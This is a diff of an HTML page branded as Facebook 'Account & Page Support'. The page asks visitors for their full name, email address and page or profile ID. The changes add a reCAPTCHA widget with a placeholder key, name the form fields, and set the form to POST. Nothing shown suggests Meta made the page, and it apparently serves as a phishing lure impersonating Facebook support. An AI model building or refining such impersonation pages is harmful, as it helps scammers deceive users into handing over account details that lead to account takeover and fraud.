@@ -5,6 +5,8 @@
   <title>Account Support</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
   <style>
     body {
       margin: 0;
@@ -39,8 +41,8 @@
     label {
       font-size: 13px;
       color: #606770;
-      margin-bottom: 6px;
       display: block;
+      margin-bottom: 6px;
     }
 
     input {
@@ -50,11 +52,6 @@
       border-radius: 6px;
       border: 1px solid #ccd0d5;
       margin-bottom: 14px;
-    }
-
-    input:focus {
-      outline: none;
-      border-color: #1877f2;
     }
 
     button {
@@ -86,24 +83,27 @@
 
   <div class="container">
     <div class="logo">facebook</div>
-
     <h3>Account & Page Support</h3>
 
-    <form>
+    <form action="#" method="POST">
       <label>Full Name</label>
-      <input type="text" placeholder="Enter your full name" required>
+      <input type="text" name="name" required>
 
       <label>Email Address</label>
-      <input type="email" placeholder="Enter your email" required>
+      <input type="email" name="email" required>
 
       <label>Page or Profile ID</label>
-      <input type="text" placeholder="Enter ID or page name" required>
+      <input type="text" name="page_id" required>
 
+      <!-- Google reCAPTCHA -->
+      <div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY_HERE"></div>
+
+      <br>
       <button type="submit">Submit</button>
     </form>
 
     <div class="footer-text">
-      This page is for support & verification purposes only.
+      This page is for support purposes only.
     </div>
   </div>
 
